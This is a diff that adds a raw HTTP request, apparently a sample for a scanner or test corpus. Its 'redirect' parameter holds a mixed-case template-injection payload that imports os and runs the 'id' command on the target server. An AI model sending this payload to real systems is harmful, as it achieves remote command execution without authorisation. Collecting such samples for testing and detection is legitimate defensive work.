@@ -1,0 +1,4 @@
+GET /a?redirect={%%20iMpOrT%20oS%20%}{{oS.pOpEn('Id').ReAd()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
